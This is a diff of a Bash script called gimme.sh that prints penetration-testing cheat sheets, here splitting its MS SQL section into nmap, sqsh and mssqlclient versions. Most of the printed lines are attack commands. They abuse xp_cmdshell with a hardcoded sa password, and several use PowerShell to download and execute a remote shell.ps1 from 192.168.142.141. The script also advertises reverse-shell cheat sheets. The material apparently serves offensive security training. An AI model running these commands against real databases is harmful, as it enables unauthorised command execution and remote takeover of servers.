@@ -445,14 +445,13 @@ function smb()
 			echo -e "$BWhite====================================================="
 }
 
-function mssql()
+function mssql-nmap()
 {
 			echo -e "$BWhite====================== mssql ========================="
-			echo -e "[$BGreen MS SQL $White]"
+			echo -e "[$BGreen MS SQL - nmap $White]"
 			echo -e "$Blue http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/"
-			echo -e "$BBlue nmap$White"
 			echo -e "$BPurple Enumeration$White"
-			if [ "$2" != "" ]; then
+			if [ "$2" != '' ]; then
 					echo -e "$White nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p $2 $1"
 
 			else
@@ -460,13 +459,25 @@ function mssql()
 			fi
 
 			echo -e "$BPurple Command Execution $White"
-			if [ "$2" != "" ]; then
+			if [ "$2" != '' ]; then
 					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p$2 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
 			else
 					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
 			fi
-			echo -e ""
-			echo -e "$BBlue sqsh$White"
+
+			if [ "$2" != '' ]; then
+					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p$2 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')"
+			else
+					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')\""
+			fi
+
+			echo -e "$BWhite======================================================"
+}
+
+function mssql-sqsh()
+{
+			echo -e "$BWhite====================== mssql ========================="
+			echo -e "[$BGreen MS SQL - sqsh $White]"
 			
 			echo -e "$BPurple Connection$White"
 			echo -e "$White sqsh -S $1 -U username -P password" 
@@ -541,10 +552,17 @@ function mssql()
 			echo -e "$White 1>xp_cmdshell \"powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')\""
 			echo -e "$White 2>go"
 
-			 echo -e "$White (Kali T3) cmd /c \"systeminfo\""
+			echo -e "$White (Kali T3) cmd /c \"systeminfo\""
 
-			echo -e ""
-			echo -e "$BBlue mssqlclient.py$White"
+			echo -e "$BWhite======================================================"
+}
+
+
+function mssql-mssqlclient()
+{
+			echo -e "$BWhite====================== mssql ========================="
+			echo -e "[$BGreen MS SQL - mssqlclient $White]"
+
 			echo -e "$BPurple Connection"
 			echo -e "$White mssqlclient.py username:password@$1 $Cyan # For sa or local user"
 			echo -e "$White mssqlclient.py  -db volume -windows-auth DOMAIN/USERNAME:PASSWORD@$1$Cyan # Recommended when using Domain Credentials"
@@ -562,10 +580,9 @@ function mssql()
 			echo -e "$White SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.142.141/shell.ps1\") | powershell -noprofile'"
 
 
+			echo -e "$BWhite======================================================"
 
-			echo -e "$BWhite===================================================+++=="
 }
-
 
 function validate_ip()
 {
@@ -579,7 +596,7 @@ function validate_ip()
 }
 function validate_port()
 {
-	if [ "$1" != "" ]
+	if [ "$1" != '' ]
 		then
 
 		if [[ $1 -lt 65536 && $1 -gt 0 ]] 
@@ -610,7 +627,7 @@ function validate_url()
 if [ $# -lt 1 ]
 then
 			echo -e "$BWhite====================== GimmeGimme ================================"
-			echo -e "$BGreen	--int-tty$BWhite 		: Print Reverse Shell Cheatsheet"
+			echo -e "$BGreen	--int-tty$BWhite 	: Print Reverse Shell Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --int-tty"
 		 	echo -e "$BGreen	--rev-shell$BWhite 	: Print Reverse Shell Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
@@ -622,13 +639,17 @@ then
 		 	echo -e "			Syntax: gimme.sh --gobuster URL[:RPORT]"
 			echo -e "$BGreen	--ftp $BWhite 		: Print ftp Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --ftp RHOST [RPORT]"
-			echo -e "$BGreen	--tftp $BWhite 		: Print tftp Cheatsheet"
+			echo -e "$BGreen	--tftp $BWhite 	: Print tftp Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --tftp RHOST [RPORT]"
 			echo -e "$BGreen	--smb $BWhite 		: Print smb Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --smb //RHOST/dir [RPORT]"
-			echo -e "$BGreen	--mssql $BWhite 		: Print mssql Cheatsheet"
-		 	echo -e "			Syntax: gimme.sh --mssql RHOST [RPORT]"
-			echo -e "$BGreen	--mssql $BWhite 		: Print mysql Cheatsheet"
+			echo -e "$BGreen	--mssql-nmap $BWhite 	: Print mssql-nmap Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --mssql-nmap RHOST [RPORT]"
+			echo -e "$BGreen	--mssql-sqsh $BWhite 	: Print mssql-nmap Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --mssql-sqsh RHOST [RPORT]"
+			echo -e "$BGreen	--mssql-mssqlclient $BWhite : Print mssql-mssqlclient Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --mssql-mssqlclient RHOST [RPORT]"
+			echo -e "$BGreen	--mysql $BWhite 	: Print mysql Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --mysql RHOST [RPORT]"
 		 	echo -e "$BWhite=================================================================="
 	exit
@@ -723,19 +744,47 @@ case $1 in
 		fi
 		smb $2 $3
 	;;
-	"--mssql")
+	"--mssql-nmap")
 
 		if [ $# -lt 2 ] 
 		then
-				 	echo -e "Syntax: gimme.sh --mssql RHOST [RPORT]"
+				 	echo -e "Syntax: gimme.sh --mssql-nmap RHOST [RPORT]"
 			exit
 		fi
 		validate_ip $2
-		if [ $3 != "" ] 
+		if [ "$3" != '' ] 
 		then
 					validate_port $3 
 		fi
-		mssql $2 $3
+		mssql-nmap $2 $3
+	;;
+	"--mssql-sqsh")
+
+		if [ $# -lt 2 ] 
+		then
+				 	echo -e "Syntax: gimme.sh --mssql-sqsh RHOST [RPORT]"
+			exit
+		fi
+		validate_ip $2
+		if [ "$3" != '' ] 
+		then
+					validate_port $3 
+		fi
+		mssql-sqsh $2 $3
+	;;
+	"--mssql-mssqlclient")
+
+		if [ $# -lt 2 ] 
+		then
+				 	echo -e "Syntax: gimme.sh --mssql-mssqlclient RHOST [RPORT]"
+			exit
+		fi
+		validate_ip $2
+		if [ "$3" != '' ] 
+		then
+					validate_port $3 
+		fi
+		mssql-mssqlclient $2 $3
 	;;
 
 	*)
